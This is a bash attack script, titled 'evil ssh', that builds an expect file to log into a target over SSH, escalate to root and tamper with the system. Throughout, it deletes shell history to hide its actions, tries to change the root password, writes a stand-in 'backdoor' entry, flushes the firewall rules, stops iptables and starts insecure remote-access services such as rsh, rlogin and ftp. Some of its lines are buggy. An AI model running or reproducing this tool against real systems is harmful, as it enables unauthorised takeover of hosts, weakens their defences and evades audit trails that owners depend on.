#!/usr/bin/env bash
#evil ssh; ssh attack tool
# TO DO
# remove login history when the "last" command is typed in

if [ "$1" = "-h" -o "$1" = "--help" ]; then
	echo "Usage: $0 [user@host] [password] [options]"
	exit 0
fi

#variables - can be changed to meet different needs
expectFile="connect.exp"
serviceStop="iptables"
serviceStart="xinetd inetd ssh sshd cron crond anacron cups portmap nfs smb smbd samba rsync rsh rlogin ftp"
newUser="sysd"
newPass="Password!"
port=22

if [ $# -gt 0 ]; then
	firstArg=$1
	pass=$2
	user=`echo $firstArg | /usr/bin/env awk -F"@" '{print $1}'`
else
	read -p "Enter host: " host
	read -p "Enter username: " user
	read -p "Enter password: " pass
	read -p "Enter port: " port
	if [ "port" == "" ]; then
		port=22
	fi
	firstArg="$user@$host"
fi

# echo "command would be ssh $firstArg -p $port"
if [ "$user" == "root" ]; then
	firstCmd="su"
else
	firstCmd="sudo su"
fi

echo "attemping login"

#switch to sh instead of bash or whatever default is

/bin/cat <<HEAD > $expectFile
#!/usr/bin/expect
spawn ssh $firstArg
#use correct prompt
set prompt ":|#|\\\$"
interact -o -nobuffer -re \$prompt return
send "$pass\r"
HEAD

if [ "$user" != "root" ]; then #if not root, sudo su to root and send password to be successful
	echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
	echo "send \"history -d \`history | wc -l\`; sudo su\" #make sure we don't leave a trail" >> $expectFile
	echo "interact -o -nobuffer -re \"*assword*\" return" >> $expectFile
	echo "send \"$pass\r\"" >> $expectFile
fi

/bin/cat<<MORE >> $expectFile
interact -o -nobuffer -re \$prompt return
send "history -d \`history | wc -l\`; sh" #make sure we don't leave a trail
interact -o -nobuffer -re \$prompt return
send "echo -e \"\" | passwd\r" #change root password
interact -o -nobuffer -re \$prompt return
send "echo 'balls2' >> /tmp/file\r" #add 'backdoor' user
interact -o -nobuffer -re \$prompt return
send "/usr/bin/env iptables -F || ipfw flush \r"
MORE

#start certain services
for service in $serviceStart; do
	echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
	echo "send\"/usr/bin/env service $service start\r\" " >> $expectFile
done

#stop certain services
for service in $serviceStop; do
	echo "interact -o -nobuffer -re \$prompt return" >> $expectFile
	echo "send\"/usr/bin/env service $service stop\r\" " >> $expectFile
done

/bin/cat <<BOTTOM >> $expectFile
interact -o -nobuffer -re \$prompt return
send "history -d \`history | wc -l\`; exit\r"
interact
BOTTOM

# /usr/bin/expect myfile.exp

echo "after expect"

